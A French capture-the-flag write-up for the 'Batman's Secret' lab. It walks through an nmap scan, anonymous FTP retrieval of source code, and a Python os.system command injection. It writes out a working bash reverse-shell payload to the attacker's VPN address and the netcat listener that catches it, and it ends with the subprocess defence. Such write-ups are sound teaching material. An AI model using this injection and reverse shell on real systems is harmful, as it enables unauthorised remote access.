Batman's Secret
> **Catégorie :** Injection (Command Injection)
> **Cible :** `10.10.0.6` (l'IP change à chaque redémarrage du container)
> **Concept clé :** injection de commande → reverse shell
---
Objectif
Un service maison (« Gotham Hotline ») tourne sur un port custom. Le but est
d'analyser son code source récupéré via FTP, d'y trouver une faille
d'injection de commande, et de l'exploiter pour obtenir un reverse shell
sur la machine et lire le flag.
---
1. Connexion au VPN
```bash
sudo openvpn /mnt/c/Users/youss/Downloads/EPI_Youssef_Zouaoui.ovpn
```
> Terminal laissé ouvert sans y toucher, pour maintenir l'accès au réseau du CTF.
> On travaille dans d'autres terminaux à côté.
---
2. Récupération de l'IP cible
Sur la page du challenge « Batman's Secret » (catégorie injection) :
```
Cible : 10.10.0.6
```
> Rappel : l'IP change à chaque redémarrage du container.
---
3. Scan de reconnaissance (Nmap)
```bash
nmap -sV -sC 10.10.0.6
```
Résultat : 3 ports ouverts
Port	Service	Remarque
21	FTP	anonyme autorisé
22	SSH	accès distant classique
3000	service custom	mini-serveur maison répondant « Gotham Hotline »
Le port 3000 est inhabituel → c'est très probablement là que se trouve la
logique vulnérable. Mais avant de l'attaquer à l'aveugle, on va essayer de
récupérer son code source via le FTP.
---
4. Exploration du FTP anonyme
```bash
ftp 10.10.0.6
```
Login `anonymous`, mot de passe vide. On découvre deux éléments :
`alert.py` → le code source du service tournant sur le port 3000
`logs/report.txt` → un fichier de log (vide au départ)
Récupérer le code source d'un service est un avantage énorme : on passe d'une
attaque « boîte noire » à une attaque « boîte blanche » où on lit directement la
logique.
---
5. Lecture et analyse du code source
```bash
get alert.py
cat alert.py
```
Le script révèle deux informations critiques :
a) Le mot de passe d'authentification du service :
```
G0th4mN33dsTh3B4t!
```
b) Une faille de command injection, dans cette ligne :
```python
os.system("bash -c 'echo %s > /opt/hotline/logs/report.txt'" % alert_text)
```
Pourquoi c'est vulnérable
Le texte envoyé par l'utilisateur (`alert_text`) est inséré directement
dans une commande shell via `%s`, sans aucun filtrage ni échappement.
Or `os.system()` passe la chaîne complète à un shell. Si `alert_text` contient
des caractères spéciaux du shell (`'`, `;`, `&`, `|`...), on peut casser la
syntaxe prévue et faire exécuter nos propres commandes.
C'est le principe même de la command injection : l'application fait
confiance à une entrée utilisateur qu'elle place dans un contexte
d'exécution système.
---
6. Préparation du reverse shell
Plutôt que d'exécuter des commandes une par une à l'aveugle, on va se donner un
shell interactif complet sur la machine cible. Technique : le reverse
shell — c'est la cible qui vient se connecter à nous.
a) Récupérer notre IP sur le VPN
```bash
ip a | grep tun0
```
→ `10.8.0.240` (c'est notre adresse sur le réseau du CTF, celle que la cible
devra contacter).
b) Lancer un écouteur netcat (terminal 1)
```bash
nc -lvnp 4444
```
`-l` → mode listen (écoute une connexion entrante)
`-v` → verbose (affiche les infos de connexion)
`-n` → pas de résolution DNS (plus rapide, évite les erreurs)
`-p 4444` → écoute sur le port 4444
Notre machine attend maintenant qu'on la contacte sur le port 4444.
---
7. Exploitation de la faille (terminal 2)
On se connecte au service vulnérable :
```bash
nc 10.10.0.6 3000
```
On s'authentifie avec : `G0th4mN33dsTh3B4t!`
Au moment de saisir le texte de « l'urgence », on injecte notre payload :
```
test'; bash -c 'bash -i >& /dev/tcp/10.8.0.240/4444 0>&1' & echo '
```
Décorticage de l'injection
La commande d'origine dans le code est :
`bash -c 'echo <alert_text> > .../report.txt'`
On veut la casser proprement pour glisser notre reverse shell :
Fragment	Rôle
`test'`	ferme prématurément le `'` de la commande `echo` d'origine
`;`	termine la commande echo et permet d'en enchaîner une nouvelle
`bash -c 'bash -i >& /dev/tcp/10.8.0.240/4444 0>&1'`	ouvre un shell interactif (`-i`) et redirige entrée/sortie/erreurs vers notre machine via une connexion TCP → c'est le reverse shell
`& echo '`	relance en arrière-plan (`&`) et rajoute un `echo '` vide pour rééquilibrer les guillemets restants de la commande d'origine, ce qui évite une erreur de syntaxe qui bloquerait tout
> **Le détail qui fait tout marcher :** l'équilibrage des guillemets. Comme on
> s'insère au milieu d'une commande existante, il faut que le shell final voie
> une syntaxe valide, sinon rien ne s'exécute. D'où le `echo '` final.
Comprendre le reverse shell
`/dev/tcp/IP/PORT` est un fichier spécial de bash : écrire dedans ouvre une
connexion TCP. On redirige donc :
`>&` la sortie standard et la sortie d'erreur vers cette connexion
`0>&1` l'entrée standard depuis cette même connexion
Résultat : le shell de la cible « parle » entièrement à travers notre netcat.
---
8. Réception du shell (retour terminal 1)
Le serveur cible se connecte à notre écouteur :
```
bruce@gotham:/$
```
→ On obtient un accès shell interactif en tant qu'utilisateur `bruce` sur la
machine `gotham`.
---
9. Recherche et lecture du flag
```bash
find / -name "user.txt" 2>/dev/null
```
`2>/dev/null` → on jette toutes les erreurs « Permission denied » pour ne
garder que les résultats utiles.
→ Trouvé : `/home/bruce/user.txt`
```bash
cat /home/bruce/user.txt
```
→ Affiche le contenu à soumettre comme flag.
---
Concept clé à retenir
Command Injection : quand une application insère une entrée utilisateur
non filtrée directement dans une commande système, un attaquant peut casser
la syntaxe prévue pour exécuter ses propres commandes arbitraires.
Défense associée : ne jamais concaténer d'entrée utilisateur dans une
commande shell. Utiliser des API qui séparent la commande de ses arguments
(ex. `subprocess.run([...], shell=False)` en Python), et valider/échapper
strictement les entrées.
---
Résumé de la chaîne d'attaque
```
VPN → nmap (21/22/3000) → FTP anonyme → alert.py (code source) →
mot de passe + faille os.system() → netcat listener (4444) →
injection sur le port 3000 → reverse shell (bruce@gotham) →
find user.txt → FLAG
```